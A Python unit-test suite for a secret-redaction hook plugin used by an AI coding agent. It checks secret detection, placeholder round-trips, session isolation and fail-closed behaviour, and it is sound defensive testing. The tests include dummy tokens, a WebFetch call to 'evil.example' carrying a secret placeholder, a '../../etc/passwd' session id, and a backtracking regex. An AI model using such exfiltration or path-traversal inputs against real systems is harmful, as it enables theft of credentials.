#!/usr/bin/env python3
"""Offline tests for secret-guard. Run: python3 -m unittest discover -s tests -v"""

import importlib.util
import io
import json
import os
import shutil
import sys
import tempfile
import time
import unittest
import re
from unittest.mock import patch
from contextlib import redirect_stdout

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
spec = importlib.util.spec_from_file_location("sg", os.path.join(ROOT, "bin", "secret-guard.py"))
sg = importlib.util.module_from_spec(spec)
spec.loader.exec_module(sg)

SID_A = "aaaaaaaa-1111-4111-8111-111111111111"
SID_B = "bbbbbbbb-2222-4222-8222-222222222222"
GLPAT = "glpat-Zx9Qw8Er7Ty6Ui5Op4As3"
GHP = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"


class Base(unittest.TestCase):
    def setUp(self):
        self.home = tempfile.mkdtemp(prefix="sg-test-")
        os.environ["SECRET_GUARD_HOME"] = self.home
        os.environ["CLAUDE_PLUGIN_ROOT"] = ROOT
        sg.PLUGIN_ROOT = ROOT
        with open(os.path.join(self.home, "denylist.txt"), "w") as f:
            f.write("# test\nSup3rS3cret!\nci:HunterTwo\nre:CLIENT-[0-9]{4}\n")
        self.cfg = sg.load_config()

    def tearDown(self):
        shutil.rmtree(self.home, ignore_errors=True)

    def hook(self, payload):
        sys.stdin = io.StringIO(json.dumps(payload))
        buf = io.StringIO()
        with redirect_stdout(buf):
            sg.run_hook()
        sys.stdin = sys.__stdin__
        return json.loads(buf.getvalue().strip() or "{}")

    def post(self, sid, tool, resp, cwd=None):
        return self.hook({"hook_event_name": "PostToolUse", "session_id": sid,
                          "tool_name": tool, "tool_input": {}, "tool_response": resp, "cwd": cwd})

    def pre(self, sid, tool, ti):
        return self.hook({"hook_event_name": "PreToolUse", "session_id": sid,
                          "tool_name": tool, "tool_input": ti})


class Detection(Base):
    def test_quoted_and_punctuation_passwords(self):
        for value in ["aB3defGhiJk;RemainingSecret", "@realPass123!", "$realPass123!",
                      "aB3 def,Ghi&Jk", "abc'defghi123", 'abc\\"defghi123']:
            for prefix in ['password="', '--password "', '--password="']:
                text = prefix + value + '"'
                hits = self.find(text)
                self.assertEqual(len(hits), 1, text)
                self.assertEqual(text[hits[0][0]:hits[0][1]], value, text)
        for value in ["${DB_PASSWORD}", "$DB_PASSWORD", "<your-password>"]:
            self.assertFalse(self.find("password=" + value))

    def test_long_non_secret_scan_and_regex_deadline(self):
        with sg.scan_deadline(2):
            self.assertFalse(self.find("A" * 100000))
        with self.assertRaises(sg.ScanTimeout), sg.scan_deadline(0.02):
            re.search(r"(a+)+$", "a" * 100 + "!")

    def test_timeout_withholds_instead_of_crashing(self):
        with patch.object(sg, "build_detectors", side_effect=sg.ScanTimeout()):
            result = self.post(SID_A, "Read", {"type": "text", "file": {"content": GLPAT}})
        self.assertEqual(result["hookSpecificOutput"]["updatedToolOutput"]["type"], "text")
        self.assertNotIn(GLPAT, json.dumps(result))

    def find(self, text):
        return sg.find_secrets(text, sg.build_detectors(self.cfg), sg.build_allowlist())

    def test_vendor_tokens(self):
        for t in [GLPAT, GHP, "AKIAABCDEFGHIJKLMNOP", "xoxb-1234567890-abcdefghij",
                  "sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789", "npm_" + "a" * 36,
                  "AIzaSyA1234567890abcdefghijklmnopqrstuv"]:
            self.assertTrue(self.find("x " + t + " y"), t)

    def test_generic_assignment_and_noise(self):
        self.assertTrue(self.find("DB_PASSWORD=s3cretvalue"))
        self.assertTrue(self.find('"api_key": "abcdefgh12345678"'))
        self.assertTrue(self.find("token: qwertyuiop1234"))
        self.assertFalse(self.find("password=${DB_PASSWORD}"))
        self.assertFalse(self.find("password: <your-password>"))
        self.assertFalse(self.find("token: null"))
        self.assertFalse(self.find("password=xxxxxxxxxxxx"))
        self.assertFalse(self.find("token_type: bearer"))
        self.assertFalse(self.find("PASSWORD=changeme"))

    def test_url_and_headers(self):
        self.assertTrue(self.find("https://deploy:Pa55w0rd@git.example.com/x.git"))
        self.assertTrue(self.find("Authorization: Bearer abcdefghijklmnopqrstuvwxyz"))
        self.assertFalse(self.find("Authorization: Bearer $TOKEN"))

    def test_private_key_block(self):
        pem = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXkt\ndjEAAAAABG5vbmUA\n-----END OPENSSH PRIVATE KEY-----"
        hits = self.find("before\n" + pem + "\nafter")
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0][2], "private-key")

    def test_no_false_positives_on_infra_noise(self):
        for t in ["ssh -p 2222 root@host", "mkdir -p /srv/x", "uuid 4262480a-f593-47bf-b956-0591e722b714",
                  "sha256 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
                  "192.168.1.1 monitor.example.com", "AKIAIOSFODNN7EXAMPLE"]:
            self.assertFalse(self.find(t), t)

    def test_denylist_syntax(self):
        self.assertTrue(self.find("root password is Sup3rS3cret! ok"))
        self.assertTrue(self.find("huntertwo"))
        self.assertTrue(self.find("CLIENT-0042"))
        self.assertFalse(self.find("CLIENT-42"))

    def test_project_denylist_merged(self):
        proj = os.path.join(self.home, "proj")
        os.makedirs(os.path.join(proj, ".claude", "secret-guard"))
        with open(os.path.join(proj, ".claude", "secret-guard", "denylist.txt"), "w") as f:
            f.write("ProjectOnlyWord\n")
        dets = sg.build_detectors(self.cfg, proj)
        self.assertTrue(sg.find_secrets("x ProjectOnlyWord y", dets, sg.build_allowlist(proj)))
        self.assertFalse(self.find("x ProjectOnlyWord y"))

    def test_overlap_resolution(self):
        text = "Authorization: Bearer " + GLPAT
        hits = self.find(text)
        self.assertEqual(len(hits), 1)
        self.assertEqual(text[hits[0][0]:hits[0][1]], GLPAT)

    def test_overlapping_matches_cover_entire_union_and_roundtrip(self):
        value = "prefix " + GLPAT + " suffix"
        dets = [sg.Detector("a", "denylist", re.compile(re.escape("prefix " + GLPAT[:10]))),
                sg.Detector("b", "token", re.compile(re.escape(GLPAT))),
                sg.Detector("c", "denylist", re.compile(re.escape(GLPAT[-8:] + " suffix")))]
        with sg.Vault(SID_A) as vault:
            redacted, _ = sg.redact_text(value, vault, dets, [], "Bash")
            self.assertTrue(sg.PLACEHOLDER_RE.fullmatch(redacted))
            self.assertEqual(vault.resolve(redacted), value)


class RoundTrip(Base):
    def test_known_secret_without_original_context(self):
        secret = "CorrectHorseBatteryStaple9!"
        first = self.post(SID_A, "Bash", {"stdout": "password=" + secret})
        ph = sg.PLACEHOLDER_RE.search(json.dumps(first)).group()
        self.assertIn(secret, json.dumps(self.pre(SID_A, "Bash", {"command": "echo " + ph})))
        result = self.post(SID_A, "Bash", {"stdout": secret})
        self.assertEqual(result["hookSpecificOutput"]["updatedToolOutput"]["stdout"], ph)
        self.assertEqual(self.post(SID_B, "Bash", {"stdout": secret}), {})
        prompt = self.hook({"hook_event_name": "UserPromptSubmit", "session_id": SID_A, "prompt": secret})
        self.assertEqual(prompt["decision"], "block")

    def test_discovery_is_independent_of_field_order(self):
        secret = "CorrectHorseBatteryStaple9!"
        result = self.post(SID_A, "Bash", {"stdout": secret, "stderr": "password=" + secret})
        self.assertNotIn(secret, json.dumps(result))

    def test_withholding_preserves_read_and_mcp_schemas(self):
        for tool, resp in [("Read", {"type": "text", "file": {"content": GLPAT, "numLines": 1}}),
                           ("mcp__x__get", [{"type": "text", "text": GLPAT}])]:
            result = sg.withheld_response({"tool_name": tool, "tool_response": resp}, "test")
            new = result["hookSpecificOutput"]["updatedToolOutput"]
            self.assertNotIn(GLPAT, json.dumps(new))
            self.assertEqual((new[0] if isinstance(new, list) else new)["type"], "text")
        result = sg.withheld_response({"tool_name": "Unknown", "tool_response": GLPAT}, "test")
        self.assertIs(result["continue"], False)
        self.assertNotIn("updatedToolOutput", json.dumps(result))

    def test_bash_redact_then_reinject(self):
        out = self.post(SID_A, "Bash", {"stdout": "token=" + GLPAT + "\n", "stderr": "", "interrupted": False})
        new = out["hookSpecificOutput"]["updatedToolOutput"]
        self.assertNotIn(GLPAT, json.dumps(new))
        ph = sg.PLACEHOLDER_RE.search(new["stdout"]).group(0)
        self.assertEqual(new["stdout"], "token=" + ph + "\n")
        self.assertEqual(new["stderr"], "")
        self.assertIs(new["interrupted"], False)
        self.assertIn("1 value(s)", out["hookSpecificOutput"]["additionalContext"])
        # reinject into Bash, Write, Edit and a nested MCP argument
        for tool, ti, path in [
            ("Bash", {"command": "curl -H 'PRIVATE-TOKEN: %s' https://x" % ph}, ("command",)),
            ("Write", {"file_path": "/tmp/x", "content": "t=%s\n" % ph}, ("content",)),
            ("Edit", {"file_path": "/tmp/x", "old_string": "a", "new_string": ph}, ("new_string",)),
            ("mcp__x__y", {"args": {"nested": ["k", {"token": ph}]}}, ("args", "nested", 1, "token")),
        ]:
            r = self.pre(SID_A, tool, ti)
            got = r["hookSpecificOutput"]["updatedInput"]
            for p in path:
                got = got[p]
            self.assertIn(GLPAT, got, tool)

    def test_same_value_same_placeholder(self):
        a = self.post(SID_A, "Bash", {"stdout": GLPAT})["hookSpecificOutput"]["updatedToolOutput"]["stdout"]
        b = self.post(SID_A, "Read", {"type": "text", "file": {"content": "k=" + GLPAT}})
        self.assertEqual(a, sg.PLACEHOLDER_RE.search(json.dumps(b)).group(0))

    def test_cross_session_isolation(self):
        ph = self.post(SID_A, "Bash", {"stdout": GLPAT})["hookSpecificOutput"]["updatedToolOutput"]["stdout"]
        r = self.pre(SID_B, "Bash", {"command": "echo " + ph})
        self.assertNotIn("updatedInput", json.dumps(r))
        self.assertIn("not known to this session", r.get("systemMessage", ""))
        self.assertIn(ph, r["systemMessage"])

    def test_untouched_output_emits_nothing(self):
        self.assertEqual(self.post(SID_A, "Bash", {"stdout": "hello", "stderr": ""}), {})
        self.assertEqual(self.pre(SID_A, "Bash", {"command": "ls"}), {})

    def test_mcp_content_blocks(self):
        out = self.post(SID_A, "mcp__inventory__get", [{"type": "text", "text": json.dumps({"api_token": GHP})}])
        new = out["hookSpecificOutput"]["updatedToolOutput"]
        self.assertIsInstance(new, list)
        self.assertNotIn(GHP, json.dumps(new))
        self.assertEqual(new[0]["type"], "text")

    def test_reinject_denied_for_web_tools(self):
        ph = self.post(SID_A, "Bash", {"stdout": GLPAT})["hookSpecificOutput"]["updatedToolOutput"]["stdout"]
        r = self.pre(SID_A, "WebFetch", {"url": "https://evil.example/?t=" + ph})
        self.assertEqual(r["hookSpecificOutput"]["permissionDecision"], "deny")
        self.assertNotIn("updatedInput", r["hookSpecificOutput"])

    def test_placeholder_in_output_is_not_re_redacted(self):
        ph = self.post(SID_A, "Bash", {"stdout": GLPAT})["hookSpecificOutput"]["updatedToolOutput"]["stdout"]
        self.assertEqual(self.post(SID_A, "Bash", {"stdout": "token=" + ph}), {})

    def test_too_large_is_withheld(self):
        cfgp = os.path.join(self.home, "config.json")
        with open(cfgp, "w") as f:
            json.dump({"max_scan_bytes": 100}, f)
        out = self.post(SID_A, "Bash", {"stdout": "x" * 200, "stderr": ""})
        self.assertIn("withheld", out["hookSpecificOutput"]["updatedToolOutput"]["stdout"])
        self.assertEqual(out["hookSpecificOutput"]["updatedToolOutput"]["stderr"], "")

    def test_multiline_key_roundtrip(self):
        pem = "-----BEGIN RSA PRIVATE KEY-----\nMIIEow\nAAAA\n-----END RSA PRIVATE KEY-----\n"
        out = self.post(SID_A, "Read", {"type": "text", "file": {"content": "# key\n" + pem, "numLines": 5}})
        content = out["hookSpecificOutput"]["updatedToolOutput"]["file"]["content"]
        ph = sg.PLACEHOLDER_RE.search(content).group(0)
        self.assertEqual(content, "# key\n" + ph + "\n")
        r = self.pre(SID_A, "Write", {"file_path": "/tmp/k", "content": ph})
        self.assertEqual(r["hookSpecificOutput"]["updatedInput"]["content"], pem.rstrip("\n"))


class Lifecycle(Base):
    def test_inspection_errors_block_prompt_tool_and_compaction(self):
        with patch.object(sg, "build_detectors", side_effect=OSError("sensitive diagnostic")):
            result = self.hook({"hook_event_name": "UserPromptSubmit", "session_id": SID_A, "prompt": GLPAT})
            self.assertEqual(result["decision"], "block")
        with patch.object(sg, "load_config", side_effect=ValueError("bad config")):
            self.assertEqual(self.pre(SID_A, "Bash", {"command": "ls"})["hookSpecificOutput"]["permissionDecision"], "deny")
            with patch.object(sys, "stdin", io.StringIO(json.dumps({"hook_event_name": "PreCompact", "session_id": SID_A}))):
                self.assertEqual(sg.run_hook(), 2)
        with open(os.path.join(self.home, "secret-guard.log")) as f:
            self.assertNotIn("sensitive diagnostic", f.read())

    def test_malformed_rules_and_config_fail_closed(self):
        for name, contents in [("patterns.json", "{"), ("patterns.json", '{"patterns":[{"id":"bad","kind":"test","regex":"("}]}'),
                               ("config.json", '{"prompt_policy":"blok"}'), ("config.json", '{"max_scan_bytes":-1}')]:
            path = os.path.join(self.home, name)
            with open(path, "w") as f:
                f.write(contents)
            result = self.hook({"hook_event_name": "UserPromptSubmit", "session_id": SID_A, "prompt": GLPAT})
            self.assertEqual(result["decision"], "block")
            os.unlink(path)

    def vault_path(self, sid):
        return os.path.join(self.home, "vault", sid + ".json")

    def test_vault_permissions(self):
        self.post(SID_A, "Bash", {"stdout": GLPAT})
        self.assertEqual(os.stat(self.vault_path(SID_A)).st_mode & 0o777, 0o600)
        self.assertEqual(os.stat(os.path.join(self.home, "vault")).st_mode & 0o777, 0o700)
        data = json.load(open(self.vault_path(SID_A)))
        self.assertEqual(list(data["entries"].values())[0]["value"], GLPAT)

    def test_session_end_deletes_on_clear_only(self):
        self.post(SID_A, "Bash", {"stdout": GLPAT})
        self.hook({"hook_event_name": "SessionEnd", "session_id": SID_A, "reason": "other"})
        self.assertTrue(os.path.exists(self.vault_path(SID_A)))
        self.hook({"hook_event_name": "SessionEnd", "session_id": SID_A, "reason": "clear"})
        self.assertFalse(os.path.exists(self.vault_path(SID_A)))

    def test_ttl_sweep(self):
        self.post(SID_A, "Bash", {"stdout": GLPAT})
        self.post(SID_B, "Bash", {"stdout": GHP})
        old = time.time() - 30 * 3600
        os.utime(self.vault_path(SID_B), (old, old))
        r = self.hook({"hook_event_name": "SessionStart", "session_id": SID_A, "source": "startup"})
        self.assertIn("secret-guard is active", r["hookSpecificOutput"]["additionalContext"])
        self.assertTrue(os.path.exists(self.vault_path(SID_A)))
        self.assertFalse(os.path.exists(self.vault_path(SID_B)))

    def test_use_touches_mtime(self):
        ph = self.post(SID_A, "Bash", {"stdout": GLPAT})["hookSpecificOutput"]["updatedToolOutput"]["stdout"]
        old = time.time() - 20 * 3600
        os.utime(self.vault_path(SID_A), (old, old))
        self.pre(SID_A, "Bash", {"command": "echo " + ph})
        self.assertGreater(os.stat(self.vault_path(SID_A)).st_mtime, time.time() - 60)

    def test_prompt_block_and_off(self):
        r = self.hook({"hook_event_name": "UserPromptSubmit", "session_id": SID_A, "prompt": "use " + GLPAT})
        self.assertEqual(r["decision"], "block")
        self.assertEqual(self.hook({"hook_event_name": "UserPromptSubmit", "session_id": SID_A, "prompt": "hi"}), {})
        with open(os.path.join(self.home, "config.json"), "w") as f:
            json.dump({"prompt_policy": "off"}, f)
        self.assertEqual(self.hook({"hook_event_name": "UserPromptSubmit", "session_id": SID_A, "prompt": GLPAT}), {})

    def test_failure_path_warns(self):
        r = self.hook({"hook_event_name": "PostToolUseFailure", "session_id": SID_A, "tool_name": "Bash",
                       "tool_input": {}, "tool_response": None, "error": "Exit code 1\n" + GLPAT})
        self.assertIn("WARNING", r["systemMessage"])

    def test_log_never_contains_values(self):
        self.post(SID_A, "Bash", {"stdout": "pw=" + GLPAT})
        log = open(os.path.join(self.home, "secret-guard.log")).read()
        self.assertIn("redacted", log)
        self.assertNotIn(GLPAT, log)

    def test_bad_session_id_fails_closed(self):
        out = self.post("../../etc/passwd", "Bash", {"stdout": GLPAT, "stderr": ""})
        self.assertIn("withheld", out["hookSpecificOutput"]["updatedToolOutput"]["stdout"])
        self.assertNotIn(GLPAT, json.dumps(out))

    def test_pre_compact_warn_and_block(self):
        import contextlib
        ph = self.post(SID_A, "Read", {"type": "text", "file": {"content": GLPAT}},
                       )["hookSpecificOutput"]["updatedToolOutput"]["file"]["content"]
        # Read carried a secret but had no file_path in tool_input; Write records the path
        self.pre(SID_A, "Write", {"file_path": "/tmp/out.txt", "content": ph})
        payload = {"hook_event_name": "PreCompact", "session_id": SID_A, "trigger": "auto", "custom_instructions": None}

        def run(cfg):
            with open(os.path.join(self.home, "config.json"), "w") as f:
                json.dump(cfg, f)
            sys.stdin = io.StringIO(json.dumps(payload))
            out, err = io.StringIO(), io.StringIO()
            with redirect_stdout(out), contextlib.redirect_stderr(err):
                rc = sg.run_hook()
            sys.stdin = sys.__stdin__
            return rc, out.getvalue(), err.getvalue()

        rc, out, err = run({"compact_policy": "warn"})
        self.assertEqual(rc, 0)
        self.assertIn("placeholder", out)          # summarizer instructions
        self.assertIn("/tmp/out.txt", err)
        rc, out, err = run({"compact_policy": "block"})
        self.assertEqual(rc, 2)
        self.assertIn("refused", err)
        rc, out, err = run({"compact_policy": "off"})
        self.assertEqual((rc, out), (0, ""))
        # empty vault: nothing to protect, never block
        rc, out, err = run({"compact_policy": "block"})
        self.assertEqual(rc, 2)
        self.hook({"hook_event_name": "SessionEnd", "session_id": SID_A, "reason": "clear"})
        rc, out, err = run({"compact_policy": "block"})
        self.assertEqual(rc, 0)

    def test_files_touched_tracking(self):
        proj = os.path.join(self.home, "proj")
        os.makedirs(proj)
        with open(os.path.join(proj, "secrets.env"), "w") as f:
            f.write("T=" + GLPAT + "\n")
        self.hook({"hook_event_name": "PostToolUse", "session_id": SID_A, "tool_name": "Bash", "cwd": proj,
                   "tool_input": {"command": "cd x && cat ./secrets.env | head -1; ls"},
                   "tool_response": {"stdout": "T=" + GLPAT, "stderr": ""}})
        data = json.load(open(self.vault_path(SID_A)))
        self.assertEqual(data["files"], [os.path.join(proj, "secrets.env")])
        self.assertEqual(sg.files_touched("Bash", {"command": "cat $HOME/x -n missing.txt"}, proj), [])
        self.assertEqual(sg.files_touched("Read", {"file_path": "/a"}, proj), ["/a"])

    def test_unknown_placeholder_tells_the_model(self):
        ph = self.post(SID_A, "Bash", {"stdout": GLPAT})["hookSpecificOutput"]["updatedToolOutput"]["stdout"]
        r = self.pre(SID_B, "Bash", {"command": "echo " + ph})
        self.assertIn("not known", r["hookSpecificOutput"]["additionalContext"])
        self.assertNotIn("updatedInput", r["hookSpecificOutput"])

    def test_garbage_stdin(self):
        sys.stdin = io.StringIO("not json")
        buf = io.StringIO()
        with redirect_stdout(buf):
            sg.run_hook()
        sys.stdin = sys.__stdin__
        self.assertEqual(json.loads(buf.getvalue()), {})


if __name__ == "__main__":
    unittest.main()
